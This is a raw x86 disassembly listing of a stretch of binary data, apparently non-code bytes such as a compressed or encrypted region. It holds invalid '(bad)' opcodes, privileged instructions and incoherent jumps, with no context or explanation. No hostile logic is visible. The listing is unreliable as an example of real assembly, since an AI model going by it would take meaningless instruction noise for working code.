  52a3f7:	jle    0x52a3ce
  52a3f9:	xchg   edi,eax
  52a3fa:	ret    
  52a3fb:	push   0x16
  52a3fd:	scas   al,BYTE PTR es:[edi]
  52a3fe:	add    BYTE PTR [edx],ch
  52a400:	xor    eax,0xf1270a16
  52a405:	inc    ecx
  52a406:	pop    edi
  52a407:	inc    edx
  52a408:	push   esi
  52a409:	dec    eax
  52a40a:	stos   BYTE PTR es:[edi],al
  52a40b:	ins    DWORD PTR es:[edi],dx
  52a40c:	pop    ebp
  52a40d:	out    0x50,eax
  52a40f:	inc    ebx
  52a410:	sbb    al,0xb9
  52a412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52a413:	sub    dl,BYTE PTR es:[esi+0x1a3bb139]
  52a41a:	lahf   
  52a41b:	dec    eax
  52a41c:	and    eax,0xef1d6dbb
  52a421:	pop    es
  52a422:	(bad)
  52a426:	stos   DWORD PTR es:[edi],eax
  52a427:	xchg   ecx,eax
  52a428:	popf   
  52a429:	test   al,0x80
  52a42b:	jle    0x52a491
  52a42d:	lock lods eax,DWORD PTR ds:[esi]
  52a42f:	test   eax,0xbe4f1121
  52a434:	mov    ecx,0x9d0544f6
  52a439:	mov    esi,0x38acd595
  52a43e:	out    dx,al
  52a43f:	les    ebp,FWORD PTR [esi-0x53]
  52a442:	rcr    BYTE PTR [esi],0x22
  52a445:	repnz adc al,0xf3
  52a448:	mov    ecx,0xa4cf704b
  52a44d:	xchg   ebx,eax
  52a44e:	push   esi
  52a44f:	cli    
  52a450:	push   ebp
  52a451:	mov    dl,0x7f
  52a453:	icebp  
  52a454:	(bad)  
  52a455:	outs   dx,BYTE PTR ds:[esi]
  52a456:	pop    edx
  52a457:	fisttp WORD PTR [edx-0x65]
  52a45a:	cwde   
  52a45b:	jnp    0x52a45b
  52a45d:	jae    0x52a3f3
  52a45f:	mov    bl,0x9e
  52a461:	rcr    ebp,0xd
  52a464:	inc    ebp
  52a465:	xchg   esp,eax
  52a466:	adc    dh,cl
  52a468:	jno    0x52a472
  52a46a:	fidivr WORD PTR [esi-0x2c25c68d]
  52a470:	pop    ebp
  52a471:	pop    edi
  52a472:	mov    esp,0x8a981cee
  52a477:	and    ch,BYTE PTR [ebx-0x9]
  52a47a:	xor    ecx,ebp
  52a47c:	jle    0x52a4d3
  52a47e:	lea    ecx,[esi-0x67]
  52a481:	jmp    0x52a497
  52a483:	push   esp
  52a484:	cmp    eax,DWORD PTR [ebx+0x4c01cc2a]
  52a48a:	pop    ebp
  52a48b:	retf   0x923
  52a48e:	jns    0x52a482
  52a490:	sub    BYTE PTR [edx-0x16],ah
  52a493:	lea    esp,[ecx-0x52d54df1]
  52a499:	mov    ch,0x57
  52a49b:	gs pop edx
  52a49d:	fldenv [ebx-0x7afdaea]
  52a4a3:	and    bh,bl
  52a4a5:	imul   DWORD PTR [esi-0x6c]
  52a4a8:	mov    edi,0x5beb6198
  52a4ad:	mov    dh,0xd4
  52a4af:	int    0xe5
  52a4b1:	aad    0x7b
  52a4b3:	pusha  
  52a4b4:	clc    
  52a4b5:	and    al,bl
  52a4b7:	leave  
  52a4b8:	xor    DWORD PTR [eax],0x39279344
  52a4be:	cmp    eax,0x1d159219
  52a4c3:	lods   al,BYTE PTR ds:[esi]
  52a4c4:	jmp    0x4f1b:0xdf1b9347
  52a4cb:	ss scas al,BYTE PTR es:[edi]
  52a4cd:	or     ebp,DWORD PTR [edx]
  52a4cf:	sub    bl,dl
  52a4d1:	test   DWORD PTR [ecx],ebx
  52a4d3:	fdiv   QWORD PTR [esi+0x2b8197b3]
  52a4d9:	aas    
  52a4da:	test   DWORD PTR [ecx-0x1],ebx
  52a4dd:	mov    ebx,0xe49aa5fb
  52a4e2:	mov    ch,0xee
  52a4e4:	xchg   ebp,eax
  52a4e5:	aaa    
  52a4e6:	mov    ds:0x3956d6c2,eax
  52a4eb:	ficomp DWORD PTR [ebx-0x4d10e81a]
  52a4f1:	(bad)  
  52a4f2:	setnp  dl
  52a4f5:	add    dl,BYTE PTR [esi+0x1]
  52a4f8:	hlt    
  52a4f9:	push   edx
  52a4fa:	xchg   edx,eax
  52a4fb:	xor    edi,edx
  52a4fd:	sti    
  52a4fe:	jae    0x52a537
  52a500:	xchg   edx,eax
  52a501:	mov    edx,0x9146049b
  52a506:	pop    edx
  52a507:	or     al,0x7
  52a509:	dec    ebx
  52a50a:	rcl    BYTE PTR [edi-0x7f],cl
  52a50d:	pop    ebx
  52a50e:	hlt    
  52a50f:	repz (bad) [ebp-0xe]
  52a513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52a514:	and    bl,dl
  52a516:	pmullw mm6,QWORD PTR [ecx+0x6d]
  52a51a:	add    ch,BYTE PTR [ebx-0x76a94307]
  52a520:	call   0xbbe6:0x37680a1e
  52a527:	xor    DWORD PTR [esi],esp
  52a529:	out    dx,al
  52a52a:	scas   eax,DWORD PTR es:[edi]
  52a52b:	(bad)  [ecx+0x26581591]
  52a531:	mov    eax,0xfadd99f0
  52a536:	test   DWORD PTR [eax+0x4f1bde5],eax
  52a53c:	inc    eax
  52a53d:	shr    DWORD PTR [edx],1
  52a53f:	retf   
  52a540:	add    ch,BYTE PTR [esi+0x3d]
  52a543:	mov    ch,0x4d
  52a545:	cmp    BYTE PTR [esi+0x1],ah
  52a548:	in     al,0xbe
  52a54a:	outs   dx,BYTE PTR ds:[esi]
  52a54b:	or     BYTE PTR [ebp+0x49],0xed
  52a54f:	mov    ebp,0x61e52028
  52a554:	idiv   DWORD PTR [ebx-0x703c0dbd]
  52a55a:	cmp    bl,bl
  52a55c:	je     0x52a571
  52a55e:	iret   
  52a55f:	mov    eax,0xbe1aaf5
  52a564:	(bad)  
  52a565:	push   ecx
  52a566:	pop    edi
  52a567:	shl    DWORD PTR [ecx-0x49d42ffb],cl
  52a56d:	sar    dh,cl
  52a56f:	push   eax
  52a570:	fs dec edx
  52a572:	icebp  
  52a573:	nop
  52a574:	gs jecxz 0x52a4f8
  52a577:	jmp    0x61d0fe6
  52a57c:	push   ecx
  52a57d:	jp     0x52a5a4
  52a57f:	mov    esp,DWORD PTR [edx+ebx*8]
  52a582:	imul   esp
  52a584:	inc    dx
  52a586:	mov    ecx,DWORD PTR [edx+0x76]
  52a589:	fild   DWORD PTR [eax]
  52a58b:	test   al,0xde
  52a58d:	jns    0x52a563
  52a58f:	leave  
  52a590:	cmp    al,0xe
  52a592:	in     eax,dx
  52a593:	dec    edx
  52a594:	inc    ebx
  52a595:	test   DWORD PTR [esi],edi
  52a597:	mov    dh,0x77
  52a599:	inc    ebp
  52a59a:	sbb    al,0xcd
  52a59c:	xchg   ebx,eax
  52a59d:	pop    eax
  52a59e:	stc    
  52a59f:	pop    ebx
  52a5a0:	inc    edx
  52a5a1:	xor    eax,0x6a9e957e
  52a5a6:	mov    es,WORD PTR [edx+0x665a6f95]
  52a5ac:	test   eax,0x35494eb3
  52a5b1:	sub    esi,esi
  52a5b3:	jae    0x52a53a
  52a5b5:	pop    ebx
  52a5b6:	jecxz  0x52a54c
  52a5b8:	clc    
  52a5b9:	and    ebp,DWORD PTR [edi]
  52a5bb:	fmul   QWORD PTR ds:0xc3c85593
  52a5c1:	or     esp,eax
  52a5c3:	xor    eax,0x1b64305d
  52a5c8:	fidiv  DWORD PTR [ebx]
  52a5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52a5cb:	mov    ebp,0x65769914
  52a5d0:	(bad)  
  52a5d2:	jmp    0x52a567
  52a5d4:	mov    edi,0x3c6b4291
  52a5d9:	lds    ecx,FWORD PTR ds:0x7e64bb8d
  52a5df:	dec    BYTE PTR [eax]
  52a5e1:	xchg   DWORD PTR [ebx+0x44],edi
  52a5e4:	adc    DWORD PTR [ebx+0x2],eax
  52a5e7:	push   ecx
  52a5e8:	mov    bl,0xc3
  52a5ea:	rcl    BYTE PTR [ecx],0xf2
  52a5ed:	push   ebx
  52a5ee:	mov    ds:0xa06f2a88,eax
  52a5f3:	mov    esi,0xa72bdea3
  52a5f8:	and    esp,edx
  52a5fa:	mov    ah,0xa7
  52a5fc:	(bad)  
  52a5fd:	push   ds
  52a5fe:	out    dx,al
  52a5ff:	sbb    eax,0xf952d985
  52a604:	ret    0xedc5
  52a607:	mov    dl,0xd5
  52a609:	stos   DWORD PTR es:[edi],eax
  52a60a:	fld    DWORD PTR [esi+0x1af163e9]
  52a610:	mov    bh,0xf7
  52a612:	fs sbb eax,0x1cc389d2
  52a618:	cdq    
  52a619:	cld    
  52a61a:	fdiv   QWORD PTR [ebp-0x5b65745d]
  52a620:	pop    ebx
  52a621:	int3   
  52a622:	push   edi
  52a623:	mov    dh,0xea
  52a625:	xlat   BYTE PTR ds:[ebx]
  52a626:	cmp    esp,DWORD PTR [edi-0x30]
  52a629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52a62a:	fdiv   DWORD PTR [edx+0x601ee094]
  52a630:	je     0x52a5bf
  52a632:	std    
  52a633:	iret   
  52a634:	mov    ds:0x9791d542,eax
  52a639:	sti    
  52a63a:	bound  ebx,QWORD PTR [edx]
  52a63c:	adc    esp,DWORD PTR [ecx]
  52a63e:	add    edi,DWORD PTR [ecx]
  52a640:	outs   dx,DWORD PTR ds:[esi]
  52a641:	aam    0x24
  52a643:	fisttp DWORD PTR ds:0xaa183dde
  52a649:	addr16 mov dh,0xa3
  52a64c:	dec    ebx
  52a64d:	(bad)  
  52a64e:	pop    ebx
  52a64f:	dec    ecx
  52a650:	xor    bl,ah
  52a652:	mov    cl,0xe4
  52a654:	cmp    BYTE PTR [eax+eax*8+0x3a],al
  52a658:	fisubr DWORD PTR [ecx-0x3feb43af]
  52a65e:	mov    bl,0x6c
  52a660:	aad    0x5c
  52a662:	push   eax
  52a663:	imul   DWORD PTR [ebx]
  52a665:	(bad)  
  52a666:	sbb    DWORD PTR [ecx],esi
  52a668:	lock jg 0x52a671
  52a66b:	dec    edi
  52a66c:	inc    ebp
  52a66d:	mov    bl,0x42
  52a66f:	popf   
  52a670:	xchg   esp,eax
  52a671:	cmc    
  52a672:	xchg   ecx,eax
  52a673:	xor    ebx,DWORD PTR ds:0x5ddce8e8
  52a679:	mov    bh,0x12
  52a67b:	fwait
  52a67c:	pusha  
  52a67d:	vpperm xmm5,xmm5,XMMWORD PTR [edx+r11d*2-0x2c],xmm0
  52a685:	push   esp
  52a686:	ins    BYTE PTR es:[edi],dx
  52a687:	jne    0x52a63e
  52a689:	mov    ah,0x44
  52a68b:	jae    0x52a6d6
  52a68d:	loope  0x52a62c
  52a68f:	dec    esi
  52a690:	push   cs
  52a691:	loop   0x52a70e
  52a693:	ret    0x2d17
  52a696:	adc    ebx,edi
  52a698:	ret    
  52a699:	out    dx,al
  52a69a:	mov    dl,0x53
  52a69c:	sbb    cl,0xa3
  52a69f:	inc    ecx
  52a6a0:	mov    bl,0x53
  52a6a2:	mov    eax,DWORD PTR [eax]
  52a6a4:	nop
  52a6a5:	xor    esp,DWORD PTR [eax+0x54498ce1]
  52a6ab:	aas    
  52a6ac:	lock adc DWORD PTR [ebx],ecx
  52a6af:	dec    esp
  52a6b0:	loope  0x52a71e
  52a6b2:	lods   eax,DWORD PTR ds:[esi]
  52a6b3:	or     al,0xd6
  52a6b5:	bound  edx,QWORD PTR [ebx]
  52a6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52a6b8:	ins    DWORD PTR es:[edi],dx
  52a6b9:	neg    BYTE PTR [ebp*8-0x5dc06380]
  52a6c0:	sbb    BYTE PTR [edi],0x36
  52a6c3:	addr16 in eax,0x3
  52a6c6:	sti    
  52a6c7:	xchg   edi,eax
  52a6c8:	jle    0x52a747
  52a6ca:	ret    0x5425
  52a6cd:	clc    
  52a6ce:	div    esp
  52a6d0:	loope  0x52a6ae
  52a6d2:	rcr    BYTE PTR [esi+0x6b],0x52
  52a6d6:	fyl2xp1 
  52a6d8:	retf   0x45b
  52a6db:	fdiv   QWORD PTR [eax-0x245fcd5f]
  52a6e1:	inc    eax
  52a6e3:	push   cs
  52a6e4:	jnp    0x52a6dd
  52a6e6:	push   0xde670f0b
  52a6eb:	in     eax,0x57
  52a6ed:	(bad)  
  52a6ee:	and    al,0x26
  52a6f0:	xor    bh,BYTE PTR [ecx]
  52a6f2:	in     al,0xbf
  52a6f4:	loop   0x52a766
  52a6f6:	mov    eax,0xb37667ee
  52a6fb:	xor    al,0x6d
  52a6fd:	xor    eax,0xa9b70769
  52a702:	iret   
  52a703:	xchg   ebp,eax
  52a704:	sbb    eax,0x65bbc2ab
  52a709:	pop    ss
  52a70a:	ficom  DWORD PTR gs:[ecx-0x56523178]
  52a711:	mov    cs:0x4a41972a,al
  52a717:	test   al,0x12
  52a71a:	push   fs
  52a71c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52a71d:	cmp    al,0xd0
  52a71f:	stos   BYTE PTR es:[edi],al
  52a720:	call   0x6933a1ed
  52a725:	mov    eax,0x5d6ca44b
  52a72a:	jl     0x52a6cd
  52a72c:	clc    
  52a72d:	add    ah,BYTE PTR [eax-0x547b6e78]
  52a733:	push   edi
  52a734:	add    edx,eax
  52a736:	imul   ebp,DWORD PTR [esi-0x3276c4df],0x72
  52a73d:	jle    0x52a6c4
  52a73f:	popa   
  52a740:	mov    ah,0xd5
  52a742:	adc    DWORD PTR [esi],ebp
  52a744:	out    dx,eax
  52a745:	fnstenv [ebx+0xc942206]
  52a74b:	out    dx,al
  52a74c:	mov    dh,bh
  52a74e:	sbb    al,0x39
  52a750:	xor    BYTE PTR [ecx+edx*8+0x7f859614],0x23
  52a758:	push   ss
  52a759:	push   es
  52a75a:	sub    bh,BYTE PTR [eax+0x3913c54b]
  52a760:	retf   
  52a761:	les    edi,FWORD PTR [esi+0x5fe17093]
  52a767:	sbb    DWORD PTR [ebx+0x65],esp
  52a76a:	outs   dx,BYTE PTR ds:[esi]
  52a76b:	pop    ds
  52a76c:	pop    edx
  52a76d:	fisttp QWORD PTR [eax]
  52a76f:	sar    DWORD PTR [ebx-0x4c],1
  52a772:	sti    
  52a773:	out    dx,al
  52a774:	add    cl,dl
  52a776:	xor    eax,0xf3ddaedd
  52a77b:	shl    BYTE PTR [ebp-0x3f],cl
  52a77e:	in     al,dx
  52a77f:	push   ss
  52a780:	push   eax
  52a781:	inc    edi
  52a782:	lea    eax,[ebx+0x42]
  52a785:	pushf  
  52a786:	mov    ds:0x6db1c0cf,eax
  52a78b:	xchg   esp,eax
  52a78c:	add    BYTE PTR [ebx],cl
  52a78e:	daa    
  52a78f:	sub    BYTE PTR [eax+ebx*1],bh
  52a792:	adc    ah,0x9a
  52a795:	leave  
  52a796:	mov    eax,0xc16e56e9
  52a79b:	xor    BYTE PTR [ebp-0x43d148ac],dl
  52a7a1:	jp     0x52a7cf
  52a7a3:	jnp    0x52a7a0
  52a7a5:	das    
  52a7a6:	xchg   ecx,eax
  52a7a7:	enter  0xaff9,0x97
  52a7ab:	daa    
  52a7ac:	ins    BYTE PTR es:[edi],dx
  52a7ad:	mov    ebx,0xada6eeeb
  52a7b2:	test   eax,0x84dfae2d
  52a7b7:	leave  
  52a7b8:	(bad)  
  52a7b9:	xchg   DWORD PTR [ecx-0x28],esp
  52a7bc:	mov    esi,0x19372b25
  52a7c1:	pushf  
  52a7c2:	push   edi
  52a7c3:	xchg   ebx,eax
  52a7c4:	jp     0x52a7f5
  52a7c6:	outs   dx,BYTE PTR ds:[esi]
  52a7c7:	xchg   ebp,eax
  52a7c8:	mov    ch,0xcf
  52a7ca:	addr16 mov eax,ds:0xf8ab
  52a7ce:	xchg   ebp,eax
  52a7cf:	mov    dl,0xcd
  52a7d1:	add    DWORD PTR [esi-0x7f],edx
  52a7d4:	xor    BYTE PTR [ebp+edx*4-0x5b],cl
  52a7d8:	arpl   WORD PTR [ebp-0x6ccecd9b],bp
  52a7de:	div    BYTE PTR [edi+0x39]
  52a7e1:	push   edi
  52a7e2:	push   ebp
  52a7e3:	xchg   ecx,eax
  52a7e4:	push   esp
  52a7e5:	push   ebx
  52a7e6:	pop    ebx
  52a7e7:	pop    edx
  52a7e8:	(bad)  
  52a7e9:	out    0x8b,al
  52a7eb:	ins    BYTE PTR es:[edi],dx
  52a7ec:	loopne 0x52a7b6
  52a7ee:	adc    ebp,DWORD PTR [edi+0xc]
  52a7f1:	rcl    DWORD PTR [eax],0x1c
  52a7f4:	jae    0x52a7c4
  52a7f6:	mov    ebp,0x6e11eed4
  52a7fb:	test   al,0xd4
  52a7fd:	sbb    ecx,DWORD PTR [eax+0x34]
  52a800:	int    0xef
  52a802:	hlt    
  52a803:	sub    DWORD PTR [edx+0x61769432],ebx
  52a809:	mov    WORD PTR [edi+0x52],es
  52a80c:	mov    bl,0x39
  52a80e:	sahf   
  52a80f:	xlat   BYTE PTR ds:[ebx]
  52a810:	and    eax,DWORD PTR [ebx+0x4]
  52a813:	and    DWORD PTR [edx-0x4e],0xa4457986
  52a81a:	xor    ch,BYTE PTR [edi]
  52a81c:	jmp    0x52a7fe
  52a81e:	pop    ds
  52a81f:	pop    ds
  52a820:	mov    ebx,0xb1076d9d
  52a825:	sbb    BYTE PTR [eax+0x4e],al
  52a828:	xlat   BYTE PTR ds:[ebx]
  52a829:	and    DWORD PTR [eax+esi*1+0x74],eax
  52a82d:	and    eax,0xbb34a423
  52a832:	(bad)  
  52a834:	cmp    al,0x3
  52a836:	mov    al,ds:0xf3bfcf50
  52a83b:	add    eax,DWORD PTR [esi+edi*8-0x6f]
  52a83f:	jmp    0x7767:0x8e789bcf
  52a846:	dec    ebp
  52a847:	sahf   
  52a848:	xlat   BYTE PTR ds:[ebx]
  52a849:	call   0xeba:0xc8eee465
  52a850:	bnd jae 0x52a83b
  52a853:	clc    
  52a854:	mov    esp,esi
  52a856:	push   0x60aacbb1
  52a85b:	imul   esi,DWORD PTR [edx+ebx*4-0x7d],0x32
  52a860:	push   eax
  52a861:	cli    
  52a862:	mov    al,ds:0xb2c5e073
  52a867:	retf   
  52a868:	sub    bl,dh
  52a86a:	mov    esi,0x4f2bea64
  52a86f:	mov    ah,0xd1
  52a871:	or     DWORD PTR cs:[esi+0x6c],0xfffffffb
  52a876:	dec    ecx
  52a877:	sbb    esi,DWORD PTR [eax]
  52a879:	hlt    
  52a87a:	mov    esi,0x8ab54650
  52a87f:	ja     0x52a8c4
  52a881:	ror    DWORD PTR [edi+0x58e3a0e2],0xca
  52a888:	lock frstor [eax]
  52a88b:	push   ss
  52a88c:	lods   al,BYTE PTR ds:[esi]
  52a88d:	int    0x3c
  52a88f:	and    DWORD PTR [eax-0xd5bdfc5],0xffffff88
  52a896:	mov    cs,WORD PTR ds:0x82ead445
  52a89c:	mov    edi,0x11c4cdcd
  52a8a1:	scas   al,BYTE PTR es:[edi]
  52a8a2:	inc    esi
  52a8a3:	lods   al,BYTE PTR ds:[esi]
  52a8a4:	adc    al,0xc4
  52a8a6:	and    eax,0x6dc44c11
  52a8ab:	push   ds
  52a8ac:	pop    edx
  52a8ad:	xchg   BYTE PTR [ecx+edi*8-0x527e7c06],bl
  52a8b4:	pop    ebp
  52a8b5:	pop    esi
  52a8b6:	test   ebx,ebx
  52a8b8:	and    esp,DWORD PTR [edi+0x3c8f1bc7]
  52a8be:	jns    0x52a8db
  52a8c0:	xchg   cl,al
  52a8c2:	ds icebp 
  52a8c4:	lahf   
  52a8c5:	and    dl,BYTE PTR [edx+edx*8-0x3afebe67]
  52a8cc:	ds pop esi
  52a8ce:	rol    DWORD PTR [ecx+0x67ff34cc],cl
  52a8d4:	xchg   ebp,eax
  52a8d5:	retf   0x1ef7
  52a8d8:	pop    edi
  52a8d9:	inc    edi
  52a8da:	cwde   
  52a8db:	sub    BYTE PTR [edx+ecx*4-0x70],ch
  52a8df:	cmovbe edi,DWORD PTR [ebp-0x16]
  52a8e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52a8e4:	loope  0x52a93c
  52a8e6:	and    eax,DWORD PTR [ecx]
  52a8e8:	add    al,0x7c
  52a8ea:	pop    ebx
  52a8eb:	scas   eax,DWORD PTR es:[edi]
  52a8ec:	jns    0x52a8d9
  52a8ee:	cmp    DWORD PTR [ecx+0xa],0xd6507ef5
  52a8f5:	and    al,0x0
  52a8f7:	push   ebx
  52a8f8:	nop
  52a8f9:	loope  0x52a89c
  52a8fb:	fsubr  QWORD PTR [edi-0x9349598]
  52a901:	xor    cl,BYTE PTR [edx+0x70]
  52a904:	arpl   WORD PTR [edx-0x5],bx
  52a907:	jge    0x52a8c9
  52a909:	adc    eax,0xa8f6cc35
  52a90e:	sub    BYTE PTR [eax-0x1d],cl
  52a911:	fiadd  DWORD PTR [ebx]
  52a913:	cmp    dh,ah
  52a915:	repnz mov edi,0x3bf45c3b
  52a91b:	add    DWORD PTR [edi-0x174441fd],ebp
  52a921:	frstor [ebx+0x3c]
  52a924:	mov    cl,0x2b
  52a926:	les    ebp,FWORD PTR [ecx+0x4c]
  52a929:	ret    0xf48
  52a92c:	cwde   
  52a92d:	or     ebx,DWORD PTR [ecx-0x78]
  52a930:	lods   eax,DWORD PTR ds:[esi]
  52a931:	jl     0x52a95a
  52a933:	sub    BYTE PTR [ebp-0x7db56d16],ah
  52a939:	pop    ebp
  52a93a:	jae    0x52a94e
  52a93c:	jl     0x52a916
  52a93e:	aad    0x83
  52a940:	popa   
  52a941:	or     edx,DWORD PTR [ecx-0x2c]
  52a944:	pop    edi
  52a945:	(bad)  
  52a946:	fisub  WORD PTR [esp+esi*4]
  52a949:	outs   dx,BYTE PTR ds:[esi]
  52a94a:	rol    BYTE PTR [edi+0x3a38080b],1
  52a950:	in     al,0x82
  52a952:	dec    esp
  52a953:	dec    esi
  52a954:	push   cs
  52a955:	dec    esp
  52a956:	sti    
  52a957:	aad    0x13
  52a959:	mov    ebp,0xc0144142
  52a95e:	repnz pushf 
  52a960:	xor    al,0x27
  52a962:	sbb    dl,dl
  52a964:	and    eax,0xe7b3632a
  52a969:	adc    ah,BYTE PTR [esi+eax*2]
  52a96c:	lss    esp,FWORD PTR [edi]
  52a96f:	mov    dh,0x19
  52a971:	inc    eax
  52a972:	dec    ebx
  52a973:	mov    cl,0x35
  52a975:	ins    BYTE PTR es:[edi],dx
  52a976:	mov    ebp,0x810339c6
  52a97b:	in     al,0x7
  52a97d:	pop    ss
  52a97e:	xor    BYTE PTR [ecx],ah
  52a980:	cmp    al,0xa7
  52a982:	sub    ch,bh
  52a984:	inc    ebx
  52a985:	push   ebx
  52a986:	sbb    eax,0xa2573428
  52a98b:	add    eax,0x9df689e5
  52a990:	(bad)  
  52a991:	inc    esi
  52a992:	sub    ah,BYTE PTR [edx]
  52a994:	lahf   
  52a995:	cmp    ebx,DWORD PTR [esi+edi*2-0x4e49396f]
  52a99c:	fisubr DWORD PTR [ebp+ecx*8-0x5b93149]
  52a9a4:	arpl   WORD PTR [ebx-0x1a],ax
  52a9a7:	or     bh,BYTE PTR [ebx-0x74e28be2]
  52a9ad:	loop   0x52a9ec
  52a9af:	pop    edx
  52a9b0:	call   0x738ddb5
  52a9b5:	inc    edi
  52a9b6:	mov    WORD PTR [ebp+0x30],?
  52a9b9:	push   es
  52a9ba:	(bad)  
  52a9bb:	retf   
  52a9bc:	shl    BYTE PTR [ecx],0xd3
  52a9bf:	test   DWORD PTR [esi+0x66b80d1d],edi
  52a9c5:	popf   
  52a9c6:	or     cl,BYTE PTR [esi+0x5ac48740]
  52a9cc:	jl     0x52a9db
  52a9ce:	loop   0x52a99a
  52a9d0:	jp     0x52a994
  52a9d2:	push   ecx
  52a9d3:	xchg   esp,eax
  52a9d4:	ins    BYTE PTR es:[edi],dx
  52a9d5:	shl    ch,0x36
  52a9d8:	cmp    al,0x26
  52a9da:	push   0x7e
  52a9dc:	sub    al,0xc2
  52a9de:	mov    esi,DWORD PTR [ebp+0x4c]
  52a9e1:	inc    esp
  52a9e2:	popf   
  52a9e3:	ds xchg edi,eax
  52a9e5:	fs call 0x2ad5:0x7066f207
  52a9ed:	xchg   BYTE PTR [ecx+0x6a2f9c61],dh
  52a9f3:	jno    0x52aa00
  52a9f5:	mov    bl,0xe6
  52a9f7:	fild   QWORD PTR [ecx+edx*8]
  52a9fa:	cmp    eax,DWORD PTR [ecx]
  52a9fc:	popa   
  52a9fd:	mov    al,ds:0xdb2c7cc
  52aa02:	mov    edi,DWORD PTR [edx+0x12cea9eb]
  52aa08:	(bad)  
  52aa09:	je     0x52a9a2
  52aa0b:	mov    eax,ds:0x314d5276
  52aa10:	(bad)  
  52aa11:	into   
  52aa12:	outs   dx,DWORD PTR ds:[esi]
  52aa13:	loop   0x52aa0a
  52aa15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52aa16:	jmp    0x765bdca1
  52aa1b:	pusha  
  52aa1c:	jae    0x52a9bf
  52aa1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52aa1f:	add    ebx,DWORD PTR [ebp+0x4]
  52aa22:	dec    edx
  52aa23:	fild   DWORD PTR [ecx+ebx*8+0xa1197bd]
  52aa2a:	hlt    
  52aa2b:	xor    esi,DWORD PTR [ecx]
  52aa2d:	dec    edx
  52aa2e:	pusha  
  52aa2f:	mov    DWORD PTR [eax-0x69533d63],edi
  52aa35:	or     BYTE PTR [ebx-0x943f697],al
  52aa3b:	mov    edx,0x187ab574
  52aa40:	xchg   esp,eax
  52aa41:	cdq    
  52aa42:	xor    DWORD PTR [edi],0xba729569
  52aa48:	jbe    0x52aa25
  52aa4a:	sbb    al,0xeb
  52aa4c:	jmp    0xc78c8469
  52aa51:	add    edi,DWORD PTR [eax+0x4f]
  52aa54:	xor    BYTE PTR [edx+0x36],dh
  52aa57:	sub    eax,0x63f14e38
  52aa5c:	xlat   BYTE PTR ds:[ebx]
  52aa5d:	mov    esi,0x5275e8
  52aa62:	jl     0x52aab2
  52aa64:	das    
  52aa65:	fucomi st,st(2)
  52aa67:	mov    ecx,0x884eb9ca
  52aa6c:	xor    al,0x28
  52aa6e:	hlt    
  52aa6f:	fs call esi
  52aa72:	hlt    
  52aa73:	add    cl,BYTE PTR [edi+0x3963b9b5]
  52aa79:	test   DWORD PTR [edi],ecx
  52aa7b:	mov    DWORD PTR [ecx],esp
  52aa7d:	cld    
  52aa7e:	call   DWORD PTR [edx]
  52aa80:	dec    ecx
  52aa81:	xchg   edx,eax
  52aa82:	push   es
  52aa83:	push   ecx
  52aa84:	pushf  
  52aa85:	shr    BYTE PTR [eax],cl
  52aa87:	mov    ebp,0xd1b4b44c
  52aa8c:	push   esp
  52aa8d:	mov    eax,0x926fd850
  52aa92:	sbb    dl,BYTE PTR [eax+0x588d32aa]
  52aa98:	outs   dx,DWORD PTR ds:[esi]
  52aa99:	inc    ecx
  52aa9a:	in     al,dx
  52aa9b:	sbb    al,0x87
  52aa9d:	in     al,dx
  52aa9e:	gs add bh,ah
  52aaa1:	jno    0x52aa97
  52aaa3:	sbb    BYTE PTR [eax],dl
  52aaa5:	inc    ecx
  52aaa6:	jp     0x52aacb
  52aaa8:	mov    ds:0xef321f5d,al
  52aaad:	xchg   edi,eax
  52aaae:	jns    0x52aa4c
  52aab0:	jnp    0x52ab1c
  52aab2:	xor    eax,DWORD PTR [ecx]
  52aab4:	rol    DWORD PTR ds:0xf992e9ce,1
  52aaba:	add    esi,DWORD PTR [ecx]
  52aabc:	cs xchg edi,eax
  52aabe:	add    DWORD PTR [eax+0x9c4b2f9],edx
  52aac4:	int    0x58
  52aac6:	cmp    DWORD PTR [edi-0x4f14f0e0],esp
  52aacc:	xor    ebp,0xf8ff26b4
  52aad2:	fstp   TBYTE PTR [ebx+0x131d6516]
  52aad8:	cmp    BYTE PTR [edx-0x1b],dh
  52aadb:	mov    ecx,0x521831f9
  52aae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52aae1:	or     al,0xfc
  52aae3:	pop    edi
  52aae4:	sbb    BYTE PTR [di+0xd],cl
  52aae8:	js     0x52ab26
  52aaea:	pop    eax
  52aaeb:	enter  0xe170,0xab
  52aaef:	test   BYTE PTR [edi+0x48],dl
  52aaf2:	xlat   BYTE PTR ds:[ebx]
  52aaf3:	cmp    edx,DWORD PTR [si]
  52aaf6:	fwait
  52aaf7:	dec    ebx
  52aaf8:	dec    ebx
  52aaf9:	test   DWORD PTR [edi+edx*8],esp
  52aafc:	cli    
  52aafd:	mov    eax,0x40685b2e
  52ab02:	iret   
  52ab03:	jbe    0x52ab3f
  52ab05:	jnp    0x52ab4a
  52ab07:	mov    ch,0x3b
  52ab09:	lods   eax,DWORD PTR ds:[esi]
  52ab0a:	cmp    bl,BYTE PTR [esi-0x7504fb86]
  52ab10:	push   esi
  52ab11:	sbb    dl,0x9
  52ab14:	add    al,0x62
  52ab16:	fiadd  WORD PTR [ebp+eiz*8+0x5c]
  52ab1a:	in     eax,0xd8
  52ab1c:	jae    0x52ab0e
  52ab1e:	pop    esp
  52ab1f:	mov    cl,0x77
  52ab21:	sbb    ebx,DWORD PTR [esi-0x6a83a6a6]
  52ab27:	imul   esp,DWORD PTR [ebx-0x1dc9c955],0x1d9f91fe
  52ab31:	mov    ecx,0xdbd8dd22
  52ab36:	scas   al,BYTE PTR es:[edi]
  52ab37:	es mov ch,0x49
  52ab3a:	test   eax,0x75721534
  52ab3f:	xor    eax,0xd6df6247
  52ab44:	rcl    DWORD PTR [ecx],0xa
  52ab47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52ab48:	mov    gs,ebp
  52ab4a:	std    
  52ab4b:	in     eax,0xd4
  52ab4d:	push   esi
  52ab4e:	mov    fs:0x4ea7437c,al
  52ab54:	pop    ss
  52ab55:	push   0xffffffb0
